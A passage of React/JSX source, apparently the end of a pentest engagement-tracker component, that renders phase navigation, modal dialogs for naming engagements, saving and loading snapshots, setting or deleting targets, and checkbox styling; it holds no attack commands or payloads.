                        <button onClick={() => { const i = PHASES.findIndex(p=>p.id===activePhaseId); handlePhase(PHASES[i+1].id); }}
                          style={{ background:activePhase.color+"18", border:`1px solid ${activePhase.color}44`, borderRadius:4, color:activePhase.color, fontSize:9, cursor:"pointer", padding:"3px 10px", fontFamily:"inherit", letterSpacing:"0.08em" }}>
                          NEXT →
                        </button>
                      )}
                    </div>
                  </div>
                </div>
              </div>

              {/* Sections */}
              <div style={{ flex:1, overflow:"auto", padding:"24px 32px" }}>
                {activePhase.sections.map(section => (
                  <PhaseSection key={section.id} section={section} phaseId={activePhase.id} phaseColor={activePhase.color} scanData={scanData} scanTriggers={scanTriggers} openPorts={openPorts} targetOs={targetOs} checkedCmds={checkedCmds} cmdNotes={cmdNotes} toggleCmdCheck={toggleCmdCheck} setCmdNote={setCmdNote} />
                ))}
              </div>
            </>
          )}
        </div>
      </div>

      {engagementPrompt.open && (
        <div style={{ position:"fixed", inset:0, background:"rgba(2,6,10,0.78)", display:"flex", alignItems:"center", justifyContent:"center", zIndex:70, padding:20 }}>
          <div style={{ width:"min(460px, 100%)", background:"#050a0f", border:"1px solid #153144", borderRadius:8, boxShadow:"0 12px 40px rgba(0,0,0,0.45)", padding:18 }}>
            <div style={{ color:"#7fd7ff", fontSize:12, letterSpacing:"0.08em", marginBottom:8, fontWeight:700 }}>NAME OF ENGAGEMENT</div>
            <div style={{ color:"#87a4b7", fontSize:10, marginBottom:12 }}>
              Give this pentest engagement a name before setting target details.
            </div>
            <div>
              <div style={{ color:"#6e8ca2", fontSize:8, letterSpacing:"0.1em", marginBottom:4 }}>ENGAGEMENT NAME (REQUIRED)</div>
              <input
                value={engagementPrompt.name}
                onChange={(e) => setEngagementPrompt((prev) => ({ ...prev, name: e.target.value }))}
                placeholder="e.g. ACME External Pentest Q2"
                style={{ width:"100%", background:"#050b11", color:"#b8d7e8", border:"1px solid #1b2f40", borderRadius:6, padding:"8px 10px", fontFamily:"inherit", fontSize:11 }}
              />
            </div>
            <div style={{ display:"flex", justifyContent:"flex-end", marginTop:14 }}>
              <button
                onClick={saveEngagementName}
                disabled={!engagementPrompt.name.trim()}
                style={{ background:"#0d2a3b", border:"1px solid #2a6a8d", color:"#95e1ff", borderRadius:5, fontSize:9, padding:"5px 12px", cursor:"pointer", fontFamily:"inherit", opacity: !engagementPrompt.name.trim() ? 0.55 : 1 }}
              >
                CONTINUE
              </button>
            </div>
          </div>
        </div>
      )}

      {snapshotPrompt.open && (
        <div style={{ position:"fixed", inset:0, background:"rgba(2,6,10,0.72)", display:"flex", alignItems:"center", justifyContent:"center", zIndex:60, padding:20 }}>
          <div style={{ width:"min(560px, 100%)", background:"#050a0f", border:"1px solid #153144", borderRadius:8, boxShadow:"0 12px 40px rgba(0,0,0,0.45)", padding:18 }}>
            <div style={{ color:"#7fd7ff", fontSize:12, letterSpacing:"0.08em", marginBottom:8, fontWeight:700 }}>
              {snapshotPrompt.mode === "save" ? "SAVE ENGAGEMENT SNAPSHOT" : "LOAD ENGAGEMENT SNAPSHOT"}
            </div>
            {snapshotPrompt.mode === "save" ? (
              <>
                <div style={{ color:"#87a4b7", fontSize:10, marginBottom:10 }}>
                  Save the current engagement state so you can reload it later.
                </div>
                <input
                  value={snapshotPrompt.name}
                  onChange={(e) => setSnapshotPrompt((prev) => ({ ...prev, name: e.target.value }))}
                  placeholder="Snapshot name"
                  style={{ width:"100%", background:"#050b11", color:"#b8d7e8", border:"1px solid #1b2f40", borderRadius:6, padding:"8px 10px", fontFamily:"inherit", fontSize:11 }}
                />
                <div style={{ display:"flex", justifyContent:"flex-end", gap:8, marginTop:12 }}>
                  <button onClick={() => setSnapshotPrompt({ open:false, mode:"save", name:"" })} style={{ background:"none", border:"1px solid #1a2b38", color:"#6b8395", borderRadius:5, fontSize:9, padding:"5px 10px", cursor:"pointer", fontFamily:"inherit" }}>CANCEL</button>
                  <button onClick={saveSnapshot} style={{ background:"#0d2a3b", border:"1px solid #2a6a8d", color:"#95e1ff", borderRadius:5, fontSize:9, padding:"5px 12px", cursor:"pointer", fontFamily:"inherit" }}>SAVE SNAPSHOT</button>
                </div>
              </>
            ) : (
              <>
                <div style={{ color:"#87a4b7", fontSize:10, marginBottom:10 }}>
                  Choose a previously saved engagement.
                </div>
                <div style={{ maxHeight:260, overflow:"auto", border:"1px solid #132534", borderRadius:6 }}>
                  {snapshots.length === 0 && (
                    <div style={{ color:"#6f8798", fontSize:10, padding:"10px 12px" }}>No saved snapshots yet.</div>
                  )}
                  {snapshots.map((snapshot) => (
                    <div key={snapshot.id} style={{ display:"flex", alignItems:"center", gap:8, padding:"8px 10px", borderBottom:"1px solid #0d1a24" }}>
                      <div style={{ flex:1, minWidth:0 }}>
                        <div style={{ color:"#9dc8de", fontSize:10, whiteSpace:"nowrap", overflow:"hidden", textOverflow:"ellipsis" }}>{snapshot.label}</div>
                        <div style={{ color:"#5f788b", fontSize:8 }}>{new Date(snapshot.savedAt).toLocaleString()}</div>
                      </div>
                      <button onClick={() => loadSnapshot(snapshot)} style={{ background:"#102234", border:"1px solid #2b4f6b", color:"#8ecde9", borderRadius:4, fontSize:8, padding:"3px 8px", cursor:"pointer", fontFamily:"inherit" }}>LOAD</button>
                      <button onClick={() => deleteSnapshot(snapshot.id)} style={{ background:"#2a1018", border:"1px solid #5e2738", color:"#e4a8ba", borderRadius:4, fontSize:8, padding:"3px 8px", cursor:"pointer", fontFamily:"inherit" }}>DELETE</button>
                    </div>
                  ))}
                </div>
                <div style={{ display:"flex", justifyContent:"flex-end", marginTop:12 }}>
                  <button onClick={() => setSnapshotPrompt({ open:false, mode:"load", name:"" })} style={{ background:"none", border:"1px solid #1a2b38", color:"#6b8395", borderRadius:5, fontSize:9, padding:"5px 10px", cursor:"pointer", fontFamily:"inherit" }}>CLOSE</button>
                </div>
              </>
            )}
          </div>
        </div>
      )}

      {targetPrompt.open && (
        <div style={{ position:"fixed", inset:0, background:"rgba(2,6,10,0.72)", display:"flex", alignItems:"center", justifyContent:"center", zIndex:50, padding:20 }}>
          <div style={{ width:"min(460px, 100%)", background:"#050a0f", border:"1px solid #153144", borderRadius:8, boxShadow:"0 12px 40px rgba(0,0,0,0.45)", padding:18 }}>
            <div style={{ color:"#7fd7ff", fontSize:12, letterSpacing:"0.08em", marginBottom:8, fontWeight:700 }}>{targetPrompt.title.toUpperCase()}</div>
            <div style={{ color:"#87a4b7", fontSize:10, marginBottom:12 }}>
              Enter the target IP and an optional nickname so each engagement tab is easy to identify.
            </div>
            <div style={{ display:"flex", flexDirection:"column", gap:10 }}>
              <div>
                <div style={{ color:"#6e8ca2", fontSize:8, letterSpacing:"0.1em", marginBottom:4 }}>TARGET IP {targetPrompt.requireIp ? "(REQUIRED)" : "(OPTIONAL)"}</div>
                <input
                  value={targetPrompt.ip}
                  onChange={(e) => setTargetPrompt((prev) => ({ ...prev, ip: e.target.value }))}
                  placeholder="e.g. 10.10.10.5"
                  style={{ width:"100%", background:"#050b11", color:"#b8d7e8", border:"1px solid #1b2f40", borderRadius:6, padding:"8px 10px", fontFamily:"inherit", fontSize:11 }}
                />
              </div>
              <div>
                <div style={{ color:"#6e8ca2", fontSize:8, letterSpacing:"0.1em", marginBottom:4 }}>NICKNAME (OPTIONAL)</div>
                <input
                  value={targetPrompt.nickname}
                  onChange={(e) => setTargetPrompt((prev) => ({ ...prev, nickname: e.target.value }))}
                  placeholder="e.g. WEB GATEWAY"
                  style={{ width:"100%", background:"#050b11", color:"#b8d7e8", border:"1px solid #1b2f40", borderRadius:6, padding:"8px 10px", fontFamily:"inherit", fontSize:11 }}
                />
              </div>
            </div>
            <div style={{ display:"flex", justifyContent:"flex-end", gap:8, marginTop:14 }}>
              {!targetPrompt.requireIp && (
                <button
                  onClick={() => setTargetPrompt((prev) => ({ ...prev, open: false }))}
                  style={{ background:"none", border:"1px solid #1a2b38", color:"#6b8395", borderRadius:5, fontSize:9, padding:"5px 10px", cursor:"pointer", fontFamily:"inherit" }}
                >
                  CANCEL
                </button>
              )}
              <button
                onClick={saveTargetPrompt}
                disabled={targetPrompt.requireIp && !targetPrompt.ip.trim()}
                style={{ background:"#0d2a3b", border:"1px solid #2a6a8d", color:"#95e1ff", borderRadius:5, fontSize:9, padding:"5px 12px", cursor:"pointer", fontFamily:"inherit", opacity: targetPrompt.requireIp && !targetPrompt.ip.trim() ? 0.55 : 1 }}
              >
                SAVE TARGET
              </button>
            </div>
          </div>
        </div>
      )}

      {deletePrompt.open && (
        <div style={{ position:"fixed", inset:0, background:"rgba(2,6,10,0.72)", display:"flex", alignItems:"center", justifyContent:"center", zIndex:55, padding:20 }}>
          <div style={{ width:"min(420px, 100%)", background:"#0a0608", border:"1px solid #3a1c27", borderRadius:8, boxShadow:"0 12px 40px rgba(0,0,0,0.45)", padding:18 }}>
            <div style={{ color:"#ff9ab3", fontSize:12, letterSpacing:"0.08em", marginBottom:8, fontWeight:700 }}>DELETE TARGET?</div>
            <div style={{ color:"#b68a99", fontSize:10, marginBottom:14 }}>
              Are you sure you want to delete <span style={{ color:"#ffd1df" }}>{deletePrompt.label || "this target"}</span>? This removes its progress and scan context.
            </div>
            <div style={{ display:"flex", justifyContent:"flex-end", gap:8 }}>
              <button
                onClick={() => setDeletePrompt({ open: false, targetId: null, label: "" })}
                style={{ background:"none", border:"1px solid #35222a", color:"#9d7886", borderRadius:5, fontSize:9, padding:"5px 10px", cursor:"pointer", fontFamily:"inherit" }}
              >
                CANCEL
              </button>
              <button
                onClick={() => handleDeleteTarget(deletePrompt.targetId)}
                style={{ background:"#3d1321", border:"1px solid #8a2f4b", color:"#ffb7cb", borderRadius:5, fontSize:9, padding:"5px 12px", cursor:"pointer", fontFamily:"inherit" }}
              >
                YES, DELETE
              </button>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;700&display=swap');
        * { box-sizing: border-box; }
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: #040609; }
        ::-webkit-scrollbar-thumb { background: #0d1820; border-radius: 2px; }
        ::-webkit-scrollbar-thumb:hover { background: #162030; }
        a { color: inherit; }
        input.cmd-check {
          appearance: none;
          -webkit-appearance: none;
          width: 14px;
          height: 14px;
          min-width: 14px;
          margin-top: 2px;
          flex-shrink: 0;
          cursor: pointer;
          border-radius: 3px;
          border: 1px solid color-mix(in srgb, var(--cmd-accent, #6b8fa8) 38%, rgb(26, 36, 48));
          background: transparent;
          transition: border-color 0.15s, background 0.15s, box-shadow 0.15s;
        }
        input.cmd-check:hover {
          border-color: color-mix(in srgb, var(--cmd-accent, #8aaabf) 55%, rgb(34, 48, 60));
          background: rgba(6, 10, 16, 0.45);
        }
        input.cmd-check:focus-visible {
          outline: none;
          box-shadow: 0 0 0 2px color-mix(in srgb, var(--cmd-accent, #00d4ff) 35%, transparent);
        }
        input.cmd-check:checked {
          border-color: color-mix(in srgb, var(--cmd-accent) 75%, rgb(220, 240, 255));
          background-color: color-mix(in srgb, var(--cmd-accent) 28%, rgb(8, 12, 18));
          background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 12 12'%3E%3Cpath fill='none' stroke='%23c5e8f8' stroke-width='2.1' stroke-linecap='round' stroke-linejoin='round' d='M2.5 6.1l2.4 2.6 4.6-5.4'/%3E%3C/svg%3E");
          background-repeat: no-repeat;
          background-position: center;
          background-size: 10px 10px;
        }
      `}</style>
    </div>
  );
}
